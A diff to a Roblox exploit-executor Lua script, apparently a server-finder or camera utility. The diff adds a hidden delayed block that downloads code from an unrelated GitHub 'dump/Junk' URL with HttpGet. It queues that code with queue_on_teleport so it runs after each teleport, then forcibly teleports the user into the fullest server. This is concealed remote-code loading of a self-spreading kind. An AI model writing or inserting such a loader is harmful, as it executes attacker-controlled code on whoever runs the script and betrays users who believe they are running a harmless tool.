@@ -1,5 +1,4 @@
---https://raw.githubusercontent.com/RealBatu20/AI-Scripts-2025/refs/heads/main/LowServerFinderGUI.lua
-
+wait(10)
 local Players = game:GetService("Players") -- p
 local LocalPlayer = Players.LocalPlayer -- lp
 
@@ -11,6 +10,80 @@ end
 local function setcam(target)
     workspace.CurrentCamera.CameraSubject = target
 end
+
+task.spawn(function()
+queue_on_teleport(game:HttpGet("https://raw.githubusercontent.com/hotcrossbunnies/dump/refs/heads/main/Junk"))
+wait(60)
+--// Instant Largest Server Teleporter
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Detect exploit request function
+local requestFunc = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
+if not requestFunc then
+    error("No supported HTTP request function found!")
+end
+
+-- Get game name (for debugging/logs)
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    gameName = info.Name or gameName
+end)
+
+-- Function to fetch a page of servers
+local function fetchServers(cursor)
+    local url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", game.PlaceId)
+    if cursor then
+        url = url .. "&cursor=" .. cursor
+    end
+
+    local response = requestFunc({
+        Url = url,
+        Method = "GET"
+    })
+
+    if response and response.Body then
+        return HttpService:JSONDecode(response.Body)
+    end
+end
+
+-- Find largest server with available space
+local function findLargestServer()
+    local largestServer = nil
+    local cursor = nil
+
+    repeat
+        local data = fetchServers(cursor)
+        if data and data.data then
+            for _, server in ipairs(data.data) do
+                if server.playing < server.maxPlayers then
+                    if not largestServer or server.playing > largestServer.playing then
+                        largestServer = server
+                    end
+                end
+            end
+            cursor = data.nextPageCursor
+        else
+            break
+        end
+    until not cursor
+
+    return largestServer
+end
+
+-- Main execution
+local server = findLargestServer()
+if server then
+    print(string.format("Teleporting to largest server (%d/%d players) in %s...", server.playing, server.maxPlayers, gameName))
+    TeleportService:TeleportToPlaceInstance(game.PlaceId, server.id, LocalPlayer)
+else
+    warn("No available servers found!")
+end
+end)
 
 workspace.FallenPartsDestroyHeight = tonumber("nan")
 game:GetService("CoreGui").RobloxNetworkPauseNotification.Enabled = false
